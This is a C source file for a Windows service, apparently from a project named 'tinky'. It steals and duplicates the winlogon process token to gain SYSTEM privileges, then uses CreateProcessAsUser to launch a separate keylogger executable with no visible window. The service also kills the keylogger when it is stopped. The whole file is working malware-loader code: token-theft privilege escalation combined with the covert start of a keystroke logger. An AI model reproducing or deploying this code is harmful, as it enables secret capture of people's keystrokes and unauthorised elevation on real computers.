#include "Service.h"

void WINAPI ServiceEventHandler(DWORD dwControl)
{
	switch (dwControl)
	{
		case SERVICE_CONTROL_STOP:
			if (tinky_g.serviceStatus.dwCurrentState != SERVICE_RUNNING)
				break;
			killProcessByName(PROGAM_NAME);
			SetEvent(tinky_g.ExitServiceHandle);
			break;
		default:
			break;
	}
}


void startKeylogger(wchar_t *PathToKeylogger)
{
	
	DWORD winlogonPID = nameToPid(SYSTEM_TOKEN);
	HANDLE winlogonHANDLE = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPID);
	HANDLE winlogonToken;

	ZeroMemory(&tinky_g.startInfo, sizeof(tinky_g.startInfo));
	tinky_g.startInfo.cb = sizeof(tinky_g.startInfo);
	ZeroMemory(&tinky_g.processInfo, sizeof(tinky_g.processInfo));

	if (OpenProcessToken(winlogonHANDLE, TOKEN_DUPLICATE, &winlogonToken) == 0)
		return;
	CloseHandle(winlogonHANDLE);	
	
	DuplicateTokenEx(winlogonToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &tinky_g.newWinlongToken);

	CloseHandle(winlogonToken);

	SetEnvironmentVariable(L"USER_LOCALAPPDATA", tinky_g.pathToLocalAppData);
	if (!CreateProcessAsUser(tinky_g.newWinlongToken, PathToKeylogger, NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &tinky_g.startInfo, &tinky_g.processInfo))
		printError("CreateProcessAsUser", GetLastError());
	
}

VOID WINAPI ServiceMain(DWORD dwNumServicesArgs, LPWSTR* lpServiceArgVectors)
{
	if (dwNumServicesArgs != 3)
	{
		setServiceStatusTinky(SERVICE_STOPPED, ERROR_SERVICE_SPECIFIC_ERROR);
		return;
	}

	tinky_g.pathToLocalAppData = lpServiceArgVectors[1];
	tinky_g.handleServiceStatus =  RegisterServiceCtrlHandler(SERVICE_NAME, ServiceEventHandler);

	if (tinky_g.handleServiceStatus == NULL)
	{
		printError("RegisterServiceCtrlHandler", GetLastError());
		return ;
	}

	setServiceStatusTinky(SERVICE_START_PENDING, NO_ERROR);

	tinky_g.ExitServiceHandle = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (tinky_g.ExitServiceHandle == NULL)
	{
		printError("CreateEvent", GetLastError());
		setServiceStatusTinky(SERVICE_STOPPED, GetLastError());
		return;
	}
	
	setServiceStatusTinky(SERVICE_RUNNING, NO_ERROR);
	
	startKeylogger(lpServiceArgVectors[2]);

	WaitForSingleObject(tinky_g.ExitServiceHandle, INFINITE);
	setServiceStatusTinky(SERVICE_STOPPED, NO_ERROR);

	CloseHandle(tinky_g.newWinlongToken);
	CloseHandle(tinky_g.startInfo.hStdInput);
	CloseHandle(tinky_g.startInfo.hStdOutput);
	CloseHandle(tinky_g.startInfo.hStdError);
	CloseHandle(tinky_g.processInfo.hProcess);
	CloseHandle(tinky_g.processInfo.hThread);
	CloseHandle(tinky_g.handleServiceStatus);
	CloseHandle(tinky_g.ServiceHandle);
	CloseHandle(tinky_g.ServiceManager);
	CloseHandle(tinky_g.ExitServiceHandle);
}


